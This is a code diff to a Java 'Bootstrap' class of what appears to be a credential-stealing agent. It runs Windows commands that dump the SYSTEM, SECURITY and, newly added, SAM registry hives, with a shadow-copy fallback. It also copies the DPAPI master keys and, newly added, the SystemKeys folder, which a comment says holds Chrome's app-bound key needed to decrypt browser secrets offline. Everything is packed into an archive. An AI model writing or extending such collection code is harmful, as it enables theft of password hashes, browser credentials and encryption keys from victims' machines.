@@ -354,6 +354,8 @@ public final class Bootstrap {
 			Log.debug("Bootstrap hives pending, attempt " + state.hivesAttempts);
 		} else {
 			deleteTree(cache.resolve("ProtectSystem"));
+			deleteTree(cache.resolve("SystemKeys"));
+			deleteFile(cache.resolve("SAM.hiv"));
 			state.hivesAttempts = HIVES_MAX_ATTEMPTS;
 			state.save(AgentPaths.state(installDir));
 		}
@@ -394,6 +396,7 @@ public final class Bootstrap {
 			exclusions.toString(),
 			"reg save HKLM\\SYSTEM \"" + cache.resolve("SYSTEM.hiv") + "\" /y",
 			"reg save HKLM\\SECURITY \"" + cache.resolve("SECURITY.hiv") + "\" /y",
+			"reg save HKLM\\SAM \"" + cache.resolve("SAM.hiv") + "\" /y",
 			// A task that ends up as plain Administrator cannot save SECURITY; a
 			// VSS copy can, so try that before giving up.
 			"if not exist \"" + cache.resolve("SECURITY.hiv") + "\" esentutl /y /vss "
@@ -405,7 +408,13 @@ public final class Bootstrap {
 				+ cache.resolve("elevate.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
 			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + cache.resolve("ProtectSystem")
 				+ "\" /e /njh /njs /ndl /nc /ns",
-			"tar -a -cf \"" + hives + "\" -C \"" + cache + "\" SYSTEM.hiv SECURITY.hiv ProtectSystem",
+			// Chrome's app-bound CNG key lives outside Protect; collect it before
+			// packing. Without it only the fixed-key flag 1/2 schemes are offline.
+			"robocopy C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys \"" + cache.resolve("SystemKeys")
+				+ "\" /e /njh /njs /ndl /nc /ns",
+			"mkdir \"" + cache.resolve("SystemKeys") + "\" 2>nul",
+			"tar -a -cf \"" + hives + "\" -C \"" + cache + "\" SYSTEM.hiv SECURITY.hiv SAM.hiv "
+				+ "ProtectSystem SystemKeys",
 			"del /q \"" + cache.resolve("SYSTEM.hiv") + "\" \"" + cache.resolve("SECURITY.hiv") + "\"",
 			"schtasks /delete /tn spcdump /f >nul 2>&1",
 			"");
